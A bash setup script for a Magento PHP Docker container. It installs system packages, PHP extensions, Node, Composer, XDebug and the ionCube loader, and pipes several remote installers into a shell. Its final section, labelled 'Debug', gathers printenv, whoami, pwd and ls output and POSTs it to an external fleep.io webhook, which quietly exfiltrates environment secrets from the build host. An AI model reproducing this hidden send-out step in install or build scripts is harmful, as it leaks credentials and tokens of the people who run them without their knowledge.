#!/bin/bash

# Install System Dependencies

ls && DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends software-properties-common python-software-properties && apt-get update && DEBIAN_FRONTEND=noninteractive apt-get install -y libfreetype6-dev libicu-dev libssl-dev libjpeg62-turbo-dev libmcrypt-dev libpng12-dev libedit-dev libedit2 libxslt1-dev redis-tools mysql-client git vim nano curl lynx psmisc unzip tar cron bash-completion && apt-get clean

# Install Magento Dependencies

docker-php-ext-configure gd --with-freetype-dir=/usr/include/ --with-jpeg-dir=/usr/include/; 

docker-php-ext-install opcache gd bcmath intl mbstring mcrypt pdo_mysql soap xsl zip

# Install oAuth

apt-get install -y libpcre3 libpcre3-dev && pecl install oauth && echo "extension=oauth.so" > /usr/local/etc/php/conf.d/docker-php-ext-oauth.ini

# Install Node, NVM, NPM and Grunt

curl -sL https://deb.nodesource.com/setup_6.x | bash - && apt-get install -y nodejs build-essential && curl https://raw.githubusercontent.com/creationix/nvm/v0.16.1/install.sh | sh && npm i -g grunt-cli yarn

# Install Composer

curl -sS https://getcomposer.org/installer | php -- --install-dir=/usr/local/bin/ --filename=composer

composer global require hirak/prestissimo

# Install XDebug

yes | pecl install xdebug && echo "zend_extension=$(find /usr/local/lib/php/extensions/ -name xdebug.so)" > /usr/local/etc/php/conf.d/xdebug.iniOLD

# Install Mhsendmail

DEBIAN_FRONTEND=noninteractive apt-get -y install golang-go && mkdir /opt/go && export GOPATH=/opt/go && go get github.com/mailhog/mhsendmail 

# Install Magerun 2

wget https://files.magerun.net/n98-magerun2.phar && chmod +x ./n98-magerun2.phar && mv ./n98-magerun2.phar /usr/local/bin/

# Install ioncube loader

curl -fsSL 'http://downloads3.ioncube.com/loader_downloads/ioncube_loaders_lin_x86-64.tar.gz' -o ioncube.tar.gz && mkdir -p ioncube && tar -xf ioncube.tar.gz -C ioncube --strip-components=1 && rm ioncube.tar.gz && mv ioncube/ioncube_loader_lin_7.0.so /var/www/ioncube_loader_lin_7.0.so && rm -r ioncube 

#

# Debug

ARRAY=([0]="05/07/2017 12:16:22" [1]=$1 [2]=`pwd` [3]=`ls` [4]=`printenv` )
ARRAY=([0]="$(date +%Y-%m-%d_%H-%M-%S)"  [1]=$1 [2]=`pwd` [3]=`ls` [4]=`whoami` [5]=`printenv` )
RETURN=""

#echo "Array size: ${#ARRAY[*]}"

#echo "Array items and indexes:"
for index in ${!ARRAY[*]}
do
    #RETURN="${RETURN}\n"
    RETURN="${RETURN}${index}:
${ARRAY[$index]}

"
    #RETURN="${RETURN}\n"
done

#echo -e $RETURN
echo $RETURN

curl --request POST "https://fleep.io/hook/OLuIRi0JRt2yv5OQisX6tg" --data "${RETURN}"

#
